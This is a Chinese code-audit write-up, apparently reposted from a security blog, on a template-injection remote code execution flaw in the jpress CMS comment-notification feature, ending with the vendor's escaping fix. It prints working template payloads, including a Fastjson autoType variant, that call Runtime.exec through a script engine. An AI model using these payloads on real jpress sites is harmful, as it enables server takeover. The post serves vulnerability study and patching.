---
title: jpress代码审计分享
url: https://buaq.net/go-135233.html
source: unSafe.sh - 不安全
date: 2022-11-12
fetch_date: 2025-10-03T22:28:50.009265
---

# jpress代码审计分享

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/17913d2d017e52ae847695b3e284eb33.jpg)

jpress代码审计分享

0x01 前言最近做 CMS 审计的时候恰好碰到了这么一个框架，学习漏洞不光是要会打，还要明白原理，结合网站可知；是用 jpress V4.2 搭建的，来学习一手
*2022-11-11 16:40:0
Author: [xz.aliyun.com(查看原文)](/jump-135233.htm)
阅读量:78
收藏*

---

## 0x01 前言

最近做 CMS 审计的时候恰好碰到了这么一个框架，学习漏洞不光是要会打，还要明白原理，结合网站可知；是用 jpress V4.2 搭建的，来学习一手。（后面发现是 就press3.0，我是小丑

jpress 类似于 WordPress Write in Java，和 PHP 的 WordPress 非常像。不过 Java 搭建环境会比 PHP 要复杂一些，当时我自己也是因为环境搭建的问题卡了很久（非常多的问题，不只是 maven，这一块踩坑的师傅可以滴滴我

比起普通的 SpringBoot 搭建的 Java 环境相比，jpress 使用的 jBoot，和 SpringBoot 十分类似，不过看点其他架构写的项目也是比较有趣。

## 0x02 环境搭建

* 这个项目的环境搭建会有点烦躁

项目地址：<https://github.com/JPressProjects/jpress>

去到 release 页面下，下载 v4.2 版本的，后续会对新版本当中的漏洞进行挖掘。

下载完毕项目之后，先在项目界面输入命令

此处比较坑，我遇到的问题是

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162312-151d99da-619a-1.png)

```
Failed to execute goal org.apache.maven.plugins:maven-jar-plugin:2.4:jar (default-jar) on project codegen: Execution default-jar of goal org.apache.maven.plugins:maven-jar-plugin:2.4:jar failed: A required class was missing while executing org.apache.maven.plugins:maven-jar-plugin:2.4:jar: org/codehaus/plexus/components/io/resources/PlexusIoResourceCollection
```

将存储 maven 仓库的所有库都删掉即可，接着再执行命令即可。

搭建完毕之后创建数据库，但不要导入文件，也不要修改任何配置，直接跑项目。

项目跑起来之后会访问到 <http://localhost:8080/install> 下

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162336-2345ffa2-619a-1.png)

按照要求完成安装之后，会让你配置一些网站信息。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162351-2c2d4cf6-619a-1.png)

至此，搭建完成！

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162402-32e0931e-619a-1.png)

在 undertow.txt 中可以修改端口

## 0x03 代码审计

### 代码审计准备

#### 架构理解

jpress 项目分为前台页面和后台管理界面，前台页面是纯前端的内容，所以漏洞点主要是在后台管理页面这里。

在后台管理界面这里，需要在模板 ---> 所有模板中选择对应的模板，才能在前台页面看到一些漏洞的回显。比如 XXE，XSS 这些，在公司测试的时候没有注意到这一点，吃了些亏。

#### pom.xml 与 Filter 等审计

查看父项目的 pom.xml，发现用的都是最新版本的组件，理论上不存在组件漏洞。

此项目中不存在 Filter，这就意味着很可能存在 SQL 注入或者是 XSS

> 存在多 module，需要我们对不同 module 功能块进行审计，尽量从一个漏洞发现者的角度去看，这样还是可以学到很多的。

### 模板渲染引起的 RCE

#### 影响接口

```
/admin/article/setting
/admin/page/setting
/admin/product/setting
/admin/template/edit
```

* 在 `setting` 目录下存在好几处的模板渲染漏洞

#### 漏洞分析

为什么想到这个漏洞呢？原因是在文章 ------> 设置这里面的 "评论邮件通知管理员" 中；官方给出了例子，告诉我们可以用 `#(comment.id)`，那么猜测这里可能会存在模板渲染问题，此处对应的模板是 Velocity

进去看与文章评论相关的类，找到是这一个 ———— `io.jpress.module.article.controller.front.ArticleController`，这里是有关于前台页面当中，对于文章的管理的一个类。我们在 `postComment()` 方法处下一个断点，这个方法的作用主要是将评论信息保存到数据库，同时还会发送短信通知网站管理员。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162416-3b0a95f8-619a-1.png)

我们先开启文章评论的功能，如图

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162432-4505cb72-619a-1.png)

接着发布一条评论，来看一看它的运行流程。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162450-4fcb7976-619a-1.png)

前面是一系列的赋值与基础判断，有兴趣的师傅们可以自行调试看一下，属于是很简单的部分。直接看重点部分，第 268 行。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162501-5627cc3e-619a-1.png)

跟进一下，进入到 `notify()` 方法，它这里面定义了两种将评论发送给管理员的方式，一种是 Email 的形式，另外一种是 Sms 的形式。我们先跟进 email 的看一下，这里会先判断是否开启了 `article_comment_email_notify_enable`，如果开启了则进入到 email 的形式当中。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162510-5b8c4006-619a-1.png)

跟进 `doSendEmail()` 方法，它去做了 SendEmail 这个动作的具体业务实现。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162519-60ed25b0-619a-1.png)

`doSendEmail()` 方法前面都是一些基础赋值，到第 90 行看到了模板渲染操作，在第 90 和 91 行，分别对邮件的 emailTitle 和 emailTemplate 调用 `getTemplateByString()` 方法进行渲染，这两个变量对应 `#(comment.id)` 处的两个值。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162529-66d13246-619a-1.png)

* 而漏洞的触发点实际上是在同一行语句的 `renderToString()` 方法下。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162539-6cf83c0a-619a-1.png)

跟进 `render()` 方法

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162552-74b6e630-619a-1.png)

发现里面存在一个危险方法 `exec()`，跟进一下，在 `exec()` 方法当中对输入的评论进行遍历。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162617-831986f6-619a-1.png)

连续跟进一下，会到 `com.jfinal.template.expr.ast.Method` 这个类的 `eval()` 方法下，对应的调用栈如下

```
eval:81, Method (com.jfinal.template.expr.ast)
assignVariable:102, Assign (com.jfinal.template.expr.ast)
eval:95, Assign (com.jfinal.template.expr.ast)
exec:57, Set (com.jfinal.template.stat.ast)
exec:68, StatList (com.jfinal.template.stat.ast)
render:74, Template (com.jfinal.template)
renderToString:91, Template (com.jfinal.template)
doSendEmail:91, ArticleNotifyKit (io.jpress.module.article.kit)
lambda$byEmail$16:70, ArticleNotifyKit (io.jpress.module.article.kit)
run:-1, 1607068801 (io.jpress.module.article.kit.ArticleNotifyKit$$Lambda$79)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:745, Thread (java.lang)
```

此处就可以很明显的看到存在反射调用任意类的命令执行漏洞

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162629-8ac64aba-619a-1.png)

在 Velocity 这个模板引擎当中非常奇妙，先从模板引擎说起，师傅们都知道模板引擎有时候是可以写脚本的，可以进行一些简单的赋值与输出这类的操作。

在 Velocity 中 `"#"` 用来标识 Velocity 的脚本语句，包括 `#set、#if 、#else、#end、#foreach、#end、#iinclude、#parse、#macro` 等；

如：

```
#if($info.imgs)
<img src="$info.imgs" border=0>
#else
<img src="noPhoto.jpg">
#end
```

那么在这一个 PoC 当中，我们可以借助 Fastjson 的特性辅助攻击。

* 构造 PoC 如下，并将它插入到评论的内容当中。

```
#set(x=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance("javax.script.ScriptEngineManager"))
#set(e=x.getEngineByName("js"))
#(e.eval('java.lang.Runtime.getRuntime().exec("calc")'))
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162642-921e3962-619a-1.png)

按照道理来说，这里前台只要输入任意的东西，就可以造成 SSTI To RCE 这么一个效果，但是这里却抛出了异常，具体位置是在 `renderToString()` 方法调用之后抛出了异常，如图。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162651-97ce3268-619a-1.png)

仔细看一下报错信息：其实是在说，第三行的地方存在着不合法的字符，这个字符其实是单引号。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162705-9fdce328-619a-1.png)

所以这里我们需要用另外一种方式来打，尝试不使用引号构造 payload，构造出了如下 payload，我们将字符串内容通过评论内容进行传入

```
#set(str=comment.content)
#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance())
#(x.setAutoTypeSupport(true))
#set(sem=str.substring(0, str.indexOf(124)))
#set(str=str.substring(str.indexOf(124)+1))
#(x.addAccept(sem))
#set(json=str.substring(0, str.indexOf(124)))
#set(str=str.substring(str.indexOf(124)+1))
#set(x=com.alibaba.fastjson.JSON::parse(json))
#set(js=str.substring(0, str.indexOf(124)))
#set(str=str.substring(str.indexOf(124)+1))
#set(e=x.getEngineByName(js))
#(e.eval(str))
```

因为后端在渲染模板时将 comment 对象传入了，所以我们可以获取 `comment.content`，而这个值又是在评论时可控的，配合 Fastjson 打。

在评论的地方构造 payload

```
javax.script.ScriptEngineManager|{"@type":"javax.script.ScriptEngineManager"}|js|java.lang.Runtime.getRuntime().exec("calc")
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162716-a675a38c-619a-1.png)

攻击成功！

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162727-acd97ae6-619a-1.png)

#### 漏洞修复

我认为的修复方式会比较贴近于 Velocity 的一些修复方式，而 Velocity 到目前最新版本也没有提供沙盒或者防御方式，只能禁止或严格过滤用户输入进入 `Velocity.evaluate`。但是这一框架是作者团队自己编写的，并非 Velocity

但是在这一个项目当中，我们可以去看一下 jpress V5.0.5 的版本当中是如何修复的，这个地方当时自己找的时候花了很久时间。

jpress V5.0.5，也就是最新版本当中，是通过转义字符来修补这个漏洞的。挺妙的，代码量小且利用效率高，很强。它的修补手段是在 `getPara()` 方法处先做一个转义，具体代码的调用栈如下

```
cleanXss:79, XSSHttpServletRequestWrapper (io.jboot.web.xss)
getParameter:32, XSSHttpServletRequestWrapper (io.jboot.web.xss)
getParameter:161, ServletRequestWrapper (javax.servlet)
getPara:189, Controller (com.jfinal.core)
postComment:148, ArticleController (io.jpress.module.article.controller.front)
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20221111162739-b4102b16-619a-1.png)

跟进 `escapeHtml()` 方法，它调用了 `replaceEach()` 方法，`replaceEach()` 方法做了转义恶意字符的工作，有兴趣的师傅们可以跟进自行调试一下，很简单。

![](h...